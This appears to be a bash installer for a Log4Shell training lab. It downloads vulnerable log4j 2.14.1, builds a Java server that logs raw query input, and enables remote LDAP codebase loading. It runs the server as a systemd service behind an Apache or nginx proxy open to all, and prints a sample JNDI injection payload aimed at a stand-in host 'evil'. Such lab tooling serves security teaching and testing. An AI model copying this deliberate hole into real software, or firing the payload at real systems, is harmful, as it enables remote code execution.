#!/usr/bin/env bash
# LOG4SHELL-LAB – verbose installer
# Supports: Debian/Ubuntu …, RHEL/Fedora …, openSUSE/SLE …
set -euo pipefail

########################################
# 0. Debug & log redirection
########################################
LOGFILE=/var/log/log4shell-installer.log
exec > >(sudo tee -a "$LOGFILE") 2>&1            # everything → logfile (+ stdout)
[[ ${DEBUG:-0} == 1 ]] && set -x                 # DEBUG=1 ./lab.sh  → shell trace

trap 'code=$?; [[ $code -ne 0 ]] && { echo; echo " Failed (exit $code)"; \
      echo "--- tail $LOGFILE ---"; tail -n 20 "$LOGFILE"; }; exit $code' EXIT

step(){ printf '\e[32m[%(%Y-%m-%d %H:%M:%S)T] %s\e[0m\n' -1 "$*"; }

########################################
# 1. Web server choice
########################################
WEBSERVER="${1:-apache}"
[[ $WEBSERVER =~ ^(apache|nginx)$ ]] || { echo "Use: apache|nginx"; exit 1; }

########################################
# 2. Detect distro / package map
########################################
source /etc/os-release
step "Detected distro: $PRETTY_NAME"

case "$ID" in
  debian|ubuntu|linuxmint|pop|kali|raspbian|zorin|elementary)
    PM=apt-get;    UPDATE="$PM -qq update"; INSTALL="$PM -y install"
    APACHE_PKG=apache2; NGINX_PKG=nginx; JAVA_PKG=openjdk-17-jdk ;;
  rhel|centos|almalinux|rocky|ol|amazon|scientific|fedora)
    PM=$(command -v dnf || echo yum); UPDATE="$PM -y -q update"; INSTALL="$PM -y -q install"
    APACHE_PKG=httpd;   NGINX_PKG=nginx; JAVA_PKG=java-17-openjdk ;;
  opensuse*|sles)
    PM=zypper;     UPDATE="$PM -q refresh"; INSTALL="$PM -q -n install --no-confirm"
    APACHE_PKG=apache2; NGINX_PKG=nginx; JAVA_PKG=java-17-openjdk-devel ;;
  *) echo "Unsupported distro: $ID"; exit 1 ;;
esac

[[ $WEBSERVER == apache ]] && WEB_PKG=$APACHE_PKG || WEB_PKG=$NGINX_PKG
WEB_SERVICE=$WEB_PKG
step "Package manager: $PM  |  Web pkg: $WEB_PKG  |  Java: $JAVA_PKG"

########################################
# 3. Install deps
########################################
step "Updating package index"; sudo $UPDATE
step "Installing deps"; sudo $INSTALL "$WEB_PKG" "$JAVA_PKG" curl wget net-tools lsof

########################################
# 4. Lab dirs
########################################
LAB_ROOT=/opt/log4shell-lab; SRC=$LAB_ROOT/src; LIB=$LAB_ROOT/lib; LOG=$LAB_ROOT/logs
sudo mkdir -p "$SRC" "$LIB" "$LOG"
step "Created lab dirs at $LAB_ROOT"

########################################
# 5. Fetch Log4j jars
########################################
JVER=2.14.1
for url in \
  "https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/$JVER/log4j-api-$JVER.jar" \
  "https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/$JVER/log4j-core-$JVER.jar"
do
  step "Downloading $(basename "$url")"; sudo wget -q -nc -P "$LIB" "$url"
done

########################################
# 6. Vulnerable Java server
########################################
cat <<'JAVA' | sudo tee "$SRC/VulnerableHTTPServer.java" >/dev/null
import com.sun.net.httpserver.HttpServer;
import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger;
import java.io.OutputStream; import java.net.InetSocketAddress;
public class VulnerableHTTPServer {
  private static final Logger log = LogManager.getLogger(VulnerableHTTPServer.class);
  public static void main(String[] args) throws Exception {
    int port = 8080;
    HttpServer s = HttpServer.create(new InetSocketAddress(port),0);
    s.createContext("/", ex -> {
      String q = String.valueOf(ex.getRequestURI().getQuery());
      log.error("CLIENT INPUT: {}", q);
      String resp = "Logged: " + q + "\n";
      ex.sendResponseHeaders(200, resp.length());
      try (OutputStream os = ex.getResponseBody()) { os.write(resp.getBytes()); }
    });
    s.start(); log.info("Lab up at http://0.0.0.0:" + port);
  }
}
JAVA

cat <<'XML' | sudo tee "$SRC/log4j2.xml" >/dev/null
<?xml version="1.0"?>
<Configuration status="INFO">
 <Appenders>
   <Console name="Console"><PatternLayout pattern="[%d{HH:mm:ss}] %-5level %c - %msg%n"/></Console>
   <File name="File" fileName="/opt/log4shell-lab/logs/lab.log" append="false">
     <PatternLayout pattern="%d{yyyy-MM-dd HH:mm:ss} %-5level %c - %msg%n"/>
   </File>
 </Appenders>
 <Loggers><Root level="debug"><AppenderRef ref="Console"/><AppenderRef ref="File"/></Root></Loggers>
</Configuration>
XML

step "Compiling Java backend"; sudo javac -cp "$LIB/*" "$SRC/VulnerableHTTPServer.java"

sudo tee /etc/systemd/system/vuln-log4j.service >/dev/null <<EOF
[Unit]
Description=Log4Shell vulnerable backend
After=network.target
[Service]
Type=simple
WorkingDirectory=$LAB_ROOT
ExecStart=/usr/bin/java -Dlog4j.configurationFile=$SRC/log4j2.xml \
 -Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
 -cp $SRC:$LIB/* VulnerableHTTPServer
Restart=on-failure
StandardOutput=journal
StandardError=journal
[Install]
WantedBy=multi-user.target
EOF

########################################
# 7. Reverse-proxy config
########################################
if [[ $WEBSERVER == apache ]]; then
  step "Configuring Apache"
  command -v a2enmod &>/dev/null && sudo a2enmod proxy proxy_http headers >/dev/null
  CONF=$([[ $WEB_PKG == httpd ]] && echo /etc/httpd/conf.d/log4shell.conf || \
                                   echo /etc/apache2/conf-available/log4shell.conf)
  cat <<'APACHE' | sudo tee "$CONF" >/dev/null
<IfModule mod_proxy.c>
  ProxyPreserveHost On
  ProxyPass        / http://127.0.0.1:8080/
  ProxyPassReverse / http://127.0.0.1:8080/
  <Location "/">
    Require all granted
  </Location>
</IfModule>
APACHE
  [[ $WEB_PKG == apache2 ]] && sudo a2enconf log4shell
else
  step "Configuring nginx"
  cat <<'NGINX' | sudo tee /etc/nginx/conf.d/log4shell.conf >/dev/null
server {
  listen 80 default_server;
  server_name _;
  location / {
    proxy_pass         http://127.0.0.1:8080;
    proxy_set_header   Host $host;
    proxy_set_header   X-Real-IP $remote_addr;
    proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;
  }
}
NGINX
fi

########################################
# 8. Fire everything up
########################################
step "Enabling Java backend"; sudo systemctl daemon-reload
sudo systemctl enable --now vuln-log4j.service
sleep 2 && systemctl --no-pager status vuln-log4j.service | head -n 10

step "Starting $WEB_SERVICE"; sudo systemctl restart "$WEB_SERVICE"
sleep 2 && systemctl --no-pager status "$WEB_SERVICE" | head -n 10

########################################
# 9. Post-checks
########################################
step "Listening sockets:"
sudo lsof -i -P -n | grep -E ':(80|8080)\s' || true

echo -e "\n Ready →  http://localhost/?msg=\${jndi:ldap://evil/x}"
echo    "   Backend logs → journalctl -u vuln-log4j -f"
[[ $WEBSERVER == apache ]] \
  && echo "   Apache  logs → sudo tail -F /var/log/${WEB_SERVICE}/*access*.log" \
  || echo "   nginx   logs → sudo tail -F /var/log/nginx/access.log"
echo -e "   Installer log → $LOGFILE\n"
